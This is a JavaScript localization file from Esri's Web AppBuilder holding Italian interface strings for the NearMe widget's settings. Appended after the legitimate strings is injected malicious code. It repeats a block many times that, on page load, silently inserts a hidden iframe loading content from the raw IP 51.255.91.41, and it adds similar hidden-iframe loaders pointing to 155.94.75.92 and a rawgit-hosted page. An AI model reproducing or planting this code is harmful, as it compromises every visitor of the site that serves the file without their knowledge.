// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Miglia",acronym:"mi"},kilometers:{displayText:"Chilometri",acronym:"km"},feet:{displayText:"Piedi",acronym:"piedi"},meters:{displayText:"Metri",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"Cerca impostazioni origine",searchSourceSettingTitle:"Cerca impostazioni origine",searchSourceSettingTitleHintText:"Aggiungere e configurare servizi di geocodifica o feature layer come fonti di ricerca. Queste fonti specificate determinano ci\u00f2 che \u00e8 possibile cercare nella casella di ricerca",
addSearchSourceLabel:"Aggiungi fonte di ricerca",featureLayerLabel:"Feature layer",geocoderLabel:"Geocodificatore",nameTitle:"Nome",generalSettingLabel:"Impostazioni generali",allPlaceholderLabel:"Testo segnaposto per la ricerca in tutti:",allPlaceholderHintText:"Suggerimento: immettere il testo da visualizzare come segnaposto durante la ricerca di tutti i layer e geocodificatore",generalSettingCheckboxLabel:"Mostra popup per la feature o la posizione trovata",countryCode:"Codici paesi o regioni",
countryCodeEg:"es. ",countryCodeHint:"Se si lascia vuoto questo campo, la ricerca verr\u00e0 effettuata in tutti i paesi e le regioni",questionMark:"?",searchInCurrentMapExtent:"Esegui la ricerca nell'estensione mappa corrente",zoomScale:"Scala zoom",locatorUrl:"URL geocodificatore",locatorName:"Nome geocodificatore",locatorExample:"Esempio",locatorWarning:"Questa versione del servizio di geocodifica non \u00e8 supportata. Il widget supporta il servizio di geocodifica 10.0 e versioni successive.",
locatorTips:"I suggerimenti non sono disponibili perch\u00e9 il servizio di geocodifica non supporta tale funzionalit\u00e0.",layerSource:"Origine del layer",setLayerSource:"Imposta layer di origine",setGeocoderURL:"Imposta URL geocodificatore",searchLayerTips:"I suggerimenti non sono disponibili perch\u00e9 il feature service non supporta la funzionalit\u00e0 di paginazione.",placeholder:"Testo segnaposto",searchFields:"Campi di ricerca",displayField:"Campo visualizzazione",exactMatch:"Corrispondenza esatta",
maxSuggestions:"Suggerimenti massimi",maxResults:"Risultati massimi",enableLocalSearch:"Abilita ricerca locale",minScale:"Scala Minima",minScaleHint:"Quando la scala della mappa \u00e8 pi\u00f9 grande di questa scala, verr\u00e0 applicata la ricerca locale",radius:"Raggio",radiusHint:"Specifica il raggio di un'area intorno al centro della mappa corrente che viene utilizzato per assegnare la priorit\u00e0 alla classificazione dei candidati di geocodifica in modo che i canditati pi\u00f9 vicini alla posizione vengano restituiti per primi",
meters:"Metri",setSearchFields:"Imposta campi di ricerca",set:"Imposta",fieldName:"Nome",invalidUrlTip:"URL ${URL} non valido o non accessibile."},searchSetting:{searchSettingTabTitle:"Impostazione di ricerca",defaultBufferDistanceLabel:"Imposta distanza di buffer predefinita",maxResultCountLabel:"Limita numero di risultati",maxResultCountHintLabel:"Suggerimento: impostare il numero massimo di risultati visibili. Il valore 1 restituisce la feature pi\u00f9 vicina",maxBufferDistanceLabel:"Imposta distanza di buffer massima",
bufferDistanceUnitLabel:"Unit\u00e0 distanza di buffer",defaultBufferHintLabel:"Suggerimento: impostare il valore predefinito per il cursore buffer",maxBufferHintLabel:"Suggerimento: impostare il valore massimo per il cursore buffer",bufferUnitLabel:"Suggerimento: definire unit\u00e0 di creazione buffer",selectGraphicLocationSymbol:"Simbolo indirizzo o posizione",graphicLocationSymbolHintText:"Suggerimento: simbolo per l'indirizzo ricercato o la posizione selezionata",addressLocationPolygonHintText:"Suggerimento: simbolo per il layer poligono ricercato",
popupTitleForPolygon:"Selezionare il poligono per la posizione dell'indirizzo selezionato",popupTitleForPolyline:"Selezionare la linea per la posizione dell'indirizzo",addressLocationPolylineHintText:"Suggerimento: simbolo per il layer polilinea ricercato",fontColorLabel:"Seleziona colore font per risultati della ricerca",fontColorHintText:"Suggerimento: colore font dei risultati della ricerca",zoomToSelectedFeature:"Zoom alla feature selezionata",zoomToSelectedFeatureHintText:"Suggerimento: esegue lo zoom alla feature selezionata anzich\u00e9 al buffer",
intersectSearchLocation:"Restituisci poligono o poligoni di intersezione",intersectSearchLocationHintText:"Suggerimento: restituisce il poligono o i poligoni contenenti la posizione ricercata anzich\u00e9 i poligoni all'interno del buffer",enableProximitySearch:"Attiva ricerca di prossimit\u00e0",enableProximitySearchHintText:"Suggerimento: attiva la funzione di ricerca per localit\u00e0 vicino al risultato selezionato",bufferVisibilityLabel:"Imposta visibilit\u00e0 buffer",bufferVisibilityHintText:"Suggerimento: il buffer verr\u00e0 visualizzato sulla mappa",
bufferColorLabel:"Imposta simbolo buffer",bufferColorHintText:"Suggerimento: selezionare colore e trasparenza del buffer",searchLayerResultLabel:"Disegna solo risultati del layer selezionato",searchLayerResultHint:"Suggerimento: solo il layer selezionato nei risultati della ricerca verr\u00e0 disegnato sulla mappa",showToolToSelectLabel:"Pulsante Imposta posizione",showToolToSelectHintText:"Suggerimento: fornisce un pulsante per impostare la posizione sulla mappa anzich\u00e9 impostare sempre la posizione quando si fa clic sulla mappa",
geoDesicParamLabel:"Usa buffer geodesico",geoDesicParamHintText:"Suggerimento: utilizzare buffer geodesico anzich\u00e9 buffer euclideo (planare)"},layerSelector:{selectLayerLabel:"Seleziona layer di ricerca",layerSelectionHint:"Suggerimento: utilizzare il pulsante di impostazione per selezionare layer",addLayerButton:"Imposta"},routeSetting:{routeSettingTabTitle:"Impostazioni direzioni",routeServiceUrl:"Servizio itinerario",buttonSet:"Imposta",routeServiceUrlHintText:"Suggerimento: fare clic su \u00e2\u20ac\u02dcImposta\u00e2\u20ac\u2122 per individuare e selezionare un servizio itinerario",
directionLengthUnit:"Unit\u00e0 di lunghezza direzione",unitsForRouteHintText:"Suggerimento: utilizzato per visualizzare unit\u00e0 per percorso",selectRouteSymbol:"Seleziona simbolo per visualizzare percorso",routeSymbolHintText:"Suggerimento: utilizzato per visualizzare simbolo linea del percorso",routingDisabledMsg:"Per abilitare le direzioni assicurarsi che sull'elemento sia attivato il routing nelle impostazioni dell'applicazione."},symbologySetting:{symbologySettingTabTitle:"Impostazioni simbologia",
addSymbologyBtnLabel:"Aggiungi nuovi simboli",layerNameTitle:"Nome layer",fieldTitle:"Campo",valuesTitle:"Valori",symbolTitle:"Simbolo",actionsTitle:"Azioni",invalidConfigMsg:"Duplica campo: ${fieldName} per layer: ${layerName}"},filterSetting:{filterSettingTabTitle:"Impostazioni filtro",addTaskTip:"Aggiungere uno o pi\u00f9 filtri ai layer di ricerca selezionati e configurare i parametri per ciascuno di essi.",enableMapFilter:"Rimuovi il filtro del layer preimpostato dalla mappa.",newFilter:"Nuovo filtro",
filterExpression:"Espressione di filtro",layerDefaultSymbolTip:"Utilizza simbolo di default del layer",uploadImage:"Carica un'immagine",selectLayerTip:"Selezionare un layer.",setTitleTip:"Impostare il titolo.",noTasksTip:'Nessun filtro configurato. Fare clic su "${newFilter}" per aggiungerne uno nuovo.',collapseFiltersTip:"Comprimere le espressioni dei filtri (se presenti) quando si apre il widget"},networkServiceChooser:{arcgislabel:"Aggiungi da ArcGIS Online",serviceURLabel:"Aggiungi URL del servizio",
routeURL:"URL itinerario",validateRouteURL:"Convalida",exampleText:"Esempio",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Specificare un servizio Itinerari valido.",rateLimitExceeded:"Superato limite velocit\u00e0. Riprovare pi\u00f9 tardi.",errorInvokingService:"Nome utente o password errati."},errorStrings:{bufferErrorString:"Immettere valore numerico valido.",
selectLayerErrorString:"Selezionare i layer da cercare.",invalidDefaultValue:"La distanza di buffer predefinita non pu\u00f2 essere vuota. Specificare la distanza di buffer",invalidMaximumValue:"La distanza di buffer massima non pu\u00f2 essere vuota. Specificare la distanza di buffer",defaultValueLessThanMax:"Specificare la distanza di buffer predefinita all'interno del limite massimo",defaultBufferValueGreaterThanOne:"La distanza buffer predefinita non pu\u00f2 essere minore di 0",maximumBufferValueGreaterThanOne:"Specificare la distanza di buffer massima maggiore di 0",
invalidMaximumResultCountValue:"Specificare un valore valido per il conteggio risultati massimo.",invalidSearchSources:"Impostazioni fonte di ricerca non valide"},symbolPickerPreviewText:"Anteprima:",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});